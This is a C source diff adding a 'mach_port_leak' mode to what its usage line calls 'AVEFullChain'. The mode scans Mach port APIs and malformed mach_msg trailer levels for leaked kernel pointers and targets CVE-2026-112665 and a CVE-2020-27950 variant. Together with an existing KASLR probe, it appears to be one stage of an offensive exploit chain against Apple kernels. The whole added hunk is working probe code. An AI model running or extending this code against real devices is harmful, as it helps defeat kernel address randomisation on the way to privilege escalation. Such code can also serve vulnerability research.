@@ -13984,6 +13984,186 @@ vps_cd_done:
 
         rlog("=== KASLR_PROBE complete ===\n");
 
+    } else if (strcmp(mode, "mach_port_leak") == 0) {
+        /*
+         * mach_port_leak — Exhaustive Mach port API info leak probe
+         *
+         * Tests every mach_port_get_attributes flavor and related APIs
+         * for kernel pointer leaks. Targets CVE-2026-112665.
+         *
+         * Usage: mach_port_leak [rounds]
+         */
+        int rounds = (argc > 2) ? atoi(argv[2]) : 10;
+        rlog("=== MACH_PORT_LEAK: Exhaustive Mach port info leak ===\n");
+        rlog("Rounds: %d\n\n", rounds);
+
+        for (int r = 0; r < rounds; r++) {
+            /* Create a fresh port each round for different kernel states */
+            mach_port_t port;
+            kern_return_t kr = mach_port_allocate(mach_task_self(),
+                MACH_PORT_RIGHT_RECEIVE, &port);
+            if (kr != KERN_SUCCESS) { rlog("alloc failed\n"); continue; }
+            mach_port_insert_right(mach_task_self(), port, port,
+                MACH_MSG_TYPE_MAKE_SEND);
+
+            if (r == 0) rlog("--- mach_port_get_attributes flavors ---\n");
+
+            /* Test all known flavors */
+            int flavors[] = {
+                1, /* MACH_PORT_LIMITS_INFO */
+                2, /* MACH_PORT_RECEIVE_STATUS */
+                3, /* MACH_PORT_DNREQUESTS_SIZE */
+                4, /* MACH_PORT_TEMPOWNER */
+                5, /* MACH_PORT_IMPORTANCE_RECEIVER */
+                6, 7, 8, 9, 10, 11, 12
+            };
+            const char *fnames[] = {
+                "LIMITS", "RECV_STATUS", "DNREQ_SIZE", "TEMPOWNER",
+                "IMPORT_RECV", "flav6", "flav7", "flav8",
+                "flav9", "flav10", "flav11", "flav12"
+            };
+            for (int fi = 0; fi < 12; fi++) {
+                uint64_t buf[32];
+                memset(buf, 0xAA, sizeof(buf));
+                mach_msg_type_number_t cnt = 32;
+                kr = mach_port_get_attributes(mach_task_self(), port,
+                    flavors[fi], (mach_port_info_t)buf, &cnt);
+                if (kr == KERN_SUCCESS && cnt > 0) {
+                    for (mach_msg_type_number_t i = 0; i < cnt && i < 32; i++) {
+                        uint32_t *words = (uint32_t *)buf;
+                        /* Check 64-bit aligned pairs */
+                        if (i % 2 == 0 && i + 1 < cnt) {
+                            uint64_t val = ((uint64_t)words[i+1] << 32) | words[i];
+                            if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                                rlog("  [r%d] %s word[%u:%u]=0x%016llx *** KERNEL PTR ***\n",
+                                     r, fnames[fi], i, i+1, (unsigned long long)val);
+                            }
+                        }
+                    }
+                    if (r == 0)
+                        rlog("  %s: kr=0x0, cnt=%u\n", fnames[fi], cnt);
+                } else if (r == 0) {
+                    rlog("  %s: kr=0x%x\n", fnames[fi], kr);
+                }
+            }
+
+            /* mach_port_kobject — test on our port */
+            if (r == 0) rlog("\n--- mach_port_kobject ---\n");
+            {
+                natural_t kotype = 0;
+                mach_vm_address_t kaddr = 0;
+                kr = mach_port_kobject(mach_task_self(), port, &kotype,
+                    (mach_port_t *)&kaddr);
+                if (r == 0)
+                    rlog("  our_port: kr=0x%x type=%u addr=0x%llx\n",
+                         kr, kotype, (unsigned long long)kaddr);
+                if (kr == KERN_SUCCESS && kaddr != 0 &&
+                    ((kaddr >> 40) == 0xFFFFFE || (kaddr >> 40) == 0xFFFFFF))
+                    rlog("  [r%d] *** KERNEL ADDR from kobject! ***\n", r);
+
+                /* Also test on well-known ports */
+                mach_port_t test_ports[] = {
+                    mach_task_self(), mach_host_self(), mach_thread_self()
+                };
+                const char *pnames[] = { "task_self", "host_self", "thread_self" };
+                for (int pi = 0; pi < 3; pi++) {
+                    kaddr = 0; kotype = 0;
+                    kr = mach_port_kobject(mach_task_self(), test_ports[pi],
+                        &kotype, (mach_port_t *)&kaddr);
+                    if (r == 0)
+                        rlog("  %s: kr=0x%x type=%u addr=0x%llx\n",
+                             pnames[pi], kr, kotype, (unsigned long long)kaddr);
+                    if (kr == KERN_SUCCESS && kaddr != 0 &&
+                        ((kaddr >> 40) == 0xFFFFFE || (kaddr >> 40) == 0xFFFFFF))
+                        rlog("  [r%d] *** %s KERNEL ADDR LEAKED! 0x%llx ***\n",
+                             r, pnames[pi], (unsigned long long)kaddr);
+                }
+            }
+
+            /* mach_port_kernel_object — older API, sometimes less sanitized */
+            if (r == 0) rlog("\n--- mach_port_kernel_object ---\n");
+            {
+                unsigned int kotype2 = 0;
+                unsigned int kaddr2 = 0;
+                kr = mach_port_kernel_object(mach_task_self(), port,
+                    &kotype2, &kaddr2);
+                if (r == 0)
+                    rlog("  kr=0x%x type=%u addr=0x%x\n", kr, kotype2, kaddr2);
+                if (kr == KERN_SUCCESS && kaddr2 != 0)
+                    rlog("  [r%d] *** mach_port_kernel_object returned 0x%x ***\n",
+                         r, kaddr2);
+            }
+
+            /* Test invalid trailer element levels (5, 6) for the CVE-2020-27950 variant */
+            if (r == 0) rlog("\n--- Invalid trailer element levels ---\n");
+            {
+                /* Send a message */
+                struct { mach_msg_header_t hdr; char pad[32]; } smsg;
+                memset(&smsg, 0, sizeof(smsg));
+                smsg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+                smsg.hdr.msgh_size = sizeof(mach_msg_header_t);
+                smsg.hdr.msgh_remote_port = port;
+                mach_msg(&smsg.hdr, MACH_SEND_MSG, smsg.hdr.msgh_size,
+                    0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+
+                /* Try receiving with invalid element level 5 */
+                struct {
+                    mach_msg_header_t hdr;
+                    char data[64];
+                    mach_msg_max_trailer_t trailer;
+                } rmsg;
+                memset(&rmsg, 0xBB, sizeof(rmsg));
+                /* Element level 5 — undefined, may trigger max-size with partial init */
+                mach_msg_option_t opts = MACH_RCV_MSG |
+                    MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
+                    MACH_RCV_TRAILER_ELEMENTS(5);
+                kr = mach_msg(&rmsg.hdr, opts, 0, sizeof(rmsg), port, 0, MACH_PORT_NULL);
+                if (r == 0) rlog("  level=5: kr=0x%x\n", kr);
+                if (kr == KERN_SUCCESS) {
+                    uint8_t *tstart = (uint8_t *)&rmsg + rmsg.hdr.msgh_size;
+                    size_t tlen = sizeof(rmsg) - rmsg.hdr.msgh_size;
+                    if (tlen > 256) tlen = 256;
+                    for (size_t i = 0; i + 7 < tlen; i += 4) {
+                        uint64_t val = *(uint64_t *)(tstart + i);
+                        if (val == 0 || val == 0xBBBBBBBBBBBBBBBBULL) continue;
+                        if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                            rlog("  [r%d] level=5 +%zu: 0x%016llx *** KERNEL ***\n",
+                                 r, i, (unsigned long long)val);
+                        }
+                    }
+                }
+
+                /* Repeat for level 6 */
+                smsg.hdr.msgh_remote_port = port;
+                smsg.hdr.msgh_size = sizeof(mach_msg_header_t);
+                mach_msg(&smsg.hdr, MACH_SEND_MSG, smsg.hdr.msgh_size,
+                    0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                memset(&rmsg, 0xCC, sizeof(rmsg));
+                opts = MACH_RCV_MSG |
+                    MACH_RCV_TRAILER_TYPE(MACH_MSG_TRAILER_FORMAT_0) |
+                    MACH_RCV_TRAILER_ELEMENTS(6);
+                kr = mach_msg(&rmsg.hdr, opts, 0, sizeof(rmsg), port, 0, MACH_PORT_NULL);
+                if (r == 0) rlog("  level=6: kr=0x%x\n", kr);
+                if (kr == KERN_SUCCESS) {
+                    uint8_t *tstart = (uint8_t *)&rmsg + rmsg.hdr.msgh_size;
+                    size_t tlen = sizeof(rmsg) - rmsg.hdr.msgh_size;
+                    if (tlen > 256) tlen = 256;
+                    for (size_t i = 0; i + 7 < tlen; i += 4) {
+                        uint64_t val = *(uint64_t *)(tstart + i);
+                        if (val == 0 || val == 0xCCCCCCCCCCCCCCCCULL) continue;
+                        if ((val >> 40) == 0xFFFFFE || (val >> 40) == 0xFFFFFF) {
+                            rlog("  [r%d] level=6 +%zu: 0x%016llx *** KERNEL ***\n",
+                                 r, i, (unsigned long long)val);
+                        }
+                    }
+                }
+            }
+
+            mach_port_destroy(mach_task_self(), port);
+        }
+
+        rlog("\n=== MACH_PORT_LEAK complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
